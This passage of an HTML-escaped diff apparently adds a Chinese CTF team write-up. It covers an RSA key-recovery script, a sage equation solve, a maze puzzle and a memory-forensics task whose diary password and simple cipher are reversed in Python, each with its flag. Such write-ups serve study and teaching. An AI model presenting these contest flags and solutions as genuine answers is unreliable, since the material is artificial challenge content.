+d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1&lt;/span&gt;
+c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386&lt;/span&gt;
+kphi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, e):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; kphi &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+        phi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kphi &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; k
+        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; invq &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (phi &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+        g &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, phi, x) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]:
+            g &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gcd(g, pow(r, phi, x) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; g &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; c:
+            p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; g
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; is_prime(p)
+m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(c, d, p)
+print(n2s(m))
+&lt;span style=&#34;color:#75715e&#34;&gt;#flag{c4617a206ba83d7f824dc44e5e67196a}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;no_math_no_cry&#34;&gt;no_math_no_cry&lt;/h3&gt;
+&lt;p&gt;解方程就行&lt;/p&gt;
+&lt;p&gt;sage:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;((x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;))&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0338470&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roots()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;[(&lt;span style=&#34;color:#ae81ff&#34;&gt;6546781215792283740026379393655198304433284092086129578966582736192267592809173519135824526914006312711658519949412876200359056032790029580847075395203&lt;/span&gt;,
+  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;),
+ (&lt;span style=&#34;color:#ae81ff&#34;&gt;175590630715657737802001590114848305707265818075457058980756525809979783549&lt;/span&gt;,
+  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再long_to_bytes就行&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 709; 
+			flex-basis: 1703px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/no_math_no_cry.png&#34; data-size=&#34;795x112&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/no_math_no_cry.png&#34;
+			width=&#34;795&#34;
+			height=&#34;112&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/no_math_no_cry_hua525f350ac2cca8b34a5de91da2ae9eb_37134_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/no_math_no_cry_hua525f350ac2cca8b34a5de91da2ae9eb_37134_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cazy{1234567890_no_m4th_n0_cRy}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;
+&lt;h3 id=&#34;八卦迷宫&#34;&gt;八卦迷宫&lt;/h3&gt;
+&lt;p&gt;直接走迷宫就行&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 172; 
+			flex-basis: 414px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/maze.png&#34; data-size=&#34;1590x921&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/maze.png&#34;
+			width=&#34;1590&#34;
+			height=&#34;921&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/maze_hud53c1eb65ba67b46acd535f00e958f17_182925_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/maze_hud53c1eb65ba67b46acd535f00e958f17_182925_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;朴实无华的取证&#34;&gt;朴实无华的取证&lt;/h3&gt;
+&lt;p&gt;vol 内存取证 dump 出 &lt;code&gt;我的日记.txt.txt&lt;/code&gt;，&lt;code&gt;flag.zip&lt;/code&gt; 以及 &lt;code&gt;flag.png&lt;/code&gt; 那个文件&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 211; 
+			flex-basis: 508px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_dump.png&#34; data-size=&#34;1527x721&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_dump.png&#34;
+			width=&#34;1527&#34;
+			height=&#34;721&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_dump_hu3edb26dc3fe48af033779133e9b0d032_532606_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_dump_hu3edb26dc3fe48af033779133e9b0d032_532606_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt;我的日记.txt.txt&lt;/code&gt; 找到压缩包密码 &lt;code&gt;20211209&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 493; 
+			flex-basis: 1184px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_password1.png&#34; data-size=&#34;706x143&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_password1.png&#34;
+			width=&#34;706&#34;
+			height=&#34;143&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_password1_hu5c598f8eb1bdfa1ff9f5d629ac78c18a_46813_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_password1_hu5c598f8eb1bdfa1ff9f5d629ac78c18a_46813_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 493; 
+			flex-basis: 1184px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_password2.png&#34; data-size=&#34;706x143&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_password2.png&#34;
+			width=&#34;706&#34;
+			height=&#34;143&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_password2_hu5c598f8eb1bdfa1ff9f5d629ac78c18a_46813_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_password2_hu5c598f8eb1bdfa1ff9f5d629ac78c18a_46813_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;得到 &lt;code&gt;flag.zip&lt;/code&gt; 压缩包里的 &lt;code&gt;encrypt.txt&lt;/code&gt; 内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//幼儿园水平的加密（部分）
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Encrypt&lt;/span&gt;(string&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; str)
+{
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; str.length(); i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
+	{
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(str[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; str[i]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
+			str[i]&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(str[i]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;)
+			str[i]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(str[i]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;)
+			str[i]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(str[i]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;)
+			str[i]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;;	
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(str[i]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;)
+			str[i]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;;
+		str[i] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;;
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再通过 &lt;code&gt;flag.png&lt;/code&gt; 的内容依照上面的 &lt;code&gt;encrypt()&lt;/code&gt; 进行解密&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 130; 
+			flex-basis: 313px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_cipher.png&#34; data-size=&#34;927x709&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_cipher.png&#34;
+			width=&#34;927&#34;
+			height=&#34;709&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_cipher_hud34883ba122dfc54c6a33fe1a25f463f_93336_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/vol_cipher_hud34883ba122dfc54c6a33fe1a25f463f_93336_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]
+&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; ss &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(ss)):
+&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ord(ss[i])&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
+&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; flag
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fdcb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{Xldq_zloo_fhuwdlqob_vxffhhg_lq_iljkwlqj_wkh_hslghplf}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fdzy&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+
+sss &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fdzy&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(sss)):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(ord(sss[i]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; ord(sss[i]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;122&lt;/span&gt;):
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;i:&amp;#34;&lt;/span&gt;,i,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data:&amp;#34;&lt;/span&gt;,chr(ord(sss[i])&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;))
+print(sss)
+
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; data: c
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; data: a
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; data: w
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; data: v
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; data: i
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; data: a
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; data: n
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; data: w
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; data: i
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; data: l
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; data: l
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; data: c
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; data: e
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; data: r
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; data: t
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; data: a
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; data: i
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; data: n
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; data: l
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; data: v
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; data: s
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; data: u
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; data: c
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; data: c
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; data: e
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; data: e
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; data: d
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; data: i
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; data: n
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; data: f
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; data: i
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; data: g
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; data: h
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; data: t
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; data: i
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; data: n
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; data: g
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; data: t
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; data: h
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; data: e
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; data: e
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; data: p
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; data: i
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; data: d
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; data: e
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; data: m
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; data: i
+i: &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; data: c
+
+aaa &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fdzy&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; flag2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(aaa)):
+&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     flag2 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ord(aaa[i])&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; flag2
